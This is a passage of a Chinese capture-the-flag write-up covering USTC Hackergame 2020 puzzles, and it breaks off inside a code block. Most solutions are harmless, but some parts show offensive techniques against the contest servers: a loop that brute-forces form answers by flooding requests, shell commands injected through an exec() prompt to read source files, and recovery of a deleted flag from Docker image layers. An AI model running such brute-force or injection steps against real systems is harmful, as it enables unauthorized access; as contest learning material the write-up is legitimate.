日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span 